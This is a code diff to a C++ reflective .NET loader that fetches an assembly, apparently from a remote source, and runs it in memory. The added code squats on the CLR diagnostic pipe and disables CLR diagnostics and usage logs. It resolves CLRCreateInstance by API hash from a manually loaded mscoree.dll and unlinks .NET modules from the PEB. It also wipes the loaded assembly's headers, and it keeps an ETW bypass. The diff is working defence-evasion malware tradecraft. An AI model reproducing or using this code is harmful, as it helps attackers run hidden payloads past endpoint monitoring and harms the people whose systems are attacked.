@@ -179,6 +179,46 @@ std::vector<char> fetchRemoteEx(std::wstring url, std::wstring file, bool https)
 
     return std::vector<char>(data.begin(), data.end());
 };
+
+void PrepareStealthEnvironment() {
+    // Disable the diagnostic pipe creation
+    SetEnvironmentVariableW(L"COMPlus_EnableDiagnostics", L"0");
+
+    // Disable ETW events for the CLR (hides assembly loads from ETW)
+    //SetEnvironmentVariableW(L"COMPlus_ETWEnabled", L"0");
+
+    // Optional: Prevent the CLR from writing to the UsageLogs folder
+    SetEnvironmentVariableW(L"COMPlus_NoUsageLogs", L"1");
+}
+HANDLE BlockDiagnosticPipe() {
+    DWORD pid = GetCurrentProcessId();
+
+    // The format used by .NET Core / .NET 5+ for diagnostic pipes
+    // For .NET Framework, it often uses 'DotNetDiagnostics-{PID}-a'
+    wchar_t pipeName[MAX_PATH];
+    swprintf_s(pipeName, L"\\\\.\\pipe\\DotNetDiagnostics-%d-a", pid);
+
+    std::wcout << L"[*] Squatting on pipe: " << pipeName << std::endl;
+
+    // Create the pipe with a dummy listener
+    HANDLE hPipe = CreateNamedPipeW(
+        pipeName,
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+        1,          // Only 1 instance allowed
+        1024, 1024, // Buffer sizes
+        0,          // Timeout
+        NULL        // Security attributes
+    );
+
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        std::cout << "[-] Failed to squat on pipe. Error: " << GetLastError() << std::endl;
+        return NULL;
+    }
+
+    std::cout << "[+] Pipe squatted. CLR diagnostics blocked." << std::endl;
+    return hPipe; // Keep this handle open for the life of the process
+}
 void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https) {
 
     int argsCount = 0;
@@ -195,25 +235,26 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https)
         std::cout << "[-] Failed to bypass ETW, exiting early\n";
         return;
     };
+    HANDLE blockingPip = BlockDiagnosticPipe();
+    PrepareStealthEnvironment();
     std::wcout << L"------- Reflective .NET Loader -------\n";
-    /*
-    if (!patchRemoteETW(mainInjector.process(-1))) {
+    
+    //reducing dll imports, no mscoree.dll
+    
+    HMODULE g_ManualMscoree = mainInjector.myLdrLoadDll(L"mscoree.dll");
+	std::cout << "mscoree.dll at: " << g_ManualMscoree << "\n";
+    typedef HRESULT(WINAPI* f_CLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
+    auto pCLRCreateInstance = (f_CLRCreateInstance)syscallHandler.getFunctionAddressByHashWithModule(g_ManualMscoree, 3590936079);
+    BYTE* check = (BYTE*)pCLRCreateInstance;
+    std::cout << "First 4 bytes at export: " << std::hex
+        << (int)check[0] << " " << (int)check[1] << " "
+        << (int)check[2] << " " << (int)check[3] << std::endl;
 
-        std::cout << "[+] Patched ETW\n";
+    if (check[0] == 'm' && check[1] == 's') {
+        std::cout << "[!] CRITICAL: This is a forwarder string, not code! You are calling a string.\n";
     }
-    else {
-        std::cout << "[-] Didnt Patched ETW\n";
-    };
-    
-       if (!patchRemoteAmsi(mainInjector.process(-1))) {
-        std::cout << "[+] Patched Amsi\n";
-    }
-    else {
-		std::cout << "[-] Didnt Patched Amsi\n";
-    }
-    */
-    
-    
+	std::cout << "found CLRCreateInstance at: " << (void*)pCLRCreateInstance << "\n";
+
     
 
     HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
@@ -269,15 +310,19 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https)
 	//std::wcout << "Target .NET Version: " << std::wstring(targetVersion) << "\n\n\n";
     std::wcout << "Target .NET Version: " << clrVersion << std::endl;
     // 2. Setup the Runtime
-    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
+	std::cout << "Testing CLRCreateInstance from manually mapped mscoree.dll at: " << g_ManualMscoree << "\n";
+    
+    hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
+	std::cout << "CLRCreateInstance returned: 0x" << std::hex << hr << "\n";
     hr = metaHost->GetRuntime(clrVersion.c_str(), IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
-
+    helperHandler.UnlinkModuleFromPEB(L"mscoree.dll");
     // Get ICorRuntimeHost so we can access AppDomains
     hr = runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&runtimeHost);
     hr = runtimeHost->Start();
 
     // 3. Get the Default AppDomain
     hr = runtimeHost->GetDefaultDomain(&pAppDomainUnk);
+    helperHandler.ClearDotNetFromPeb();
     hr = pAppDomainUnk->QueryInterface(IID_PPV_ARGS(&pDefaultAppDomain));
 
     // 4. Prepare the SAFEARRAY for the bytes
@@ -291,7 +336,12 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https)
     // 5. Load the Assembly from memory and run Entry Point
     std::cout << "Loading assembly into memory...\n";
     hr = pDefaultAppDomain->Load_3(psa, &pAssembly);
-    
+
+    void* pNukePe = nullptr;
+    SafeArrayAccessData(psa, &pNukePe);
+    memset(pNukePe, 0, 0x1000); // Nuke the DOS, NT, and CLR headers in the SafeArray
+    SafeArrayUnaccessData(psa);
+
     if (FAILED(hr)) { std::cout << "Load_3 failed. HRESULT: 0x" << std::hex << hr << "\n"; goto cleanup; }
 	else { std::cout << "Assembly loaded successfully.\n"; }
     hr = pAssembly->get_EntryPoint(&pEntryPoint);
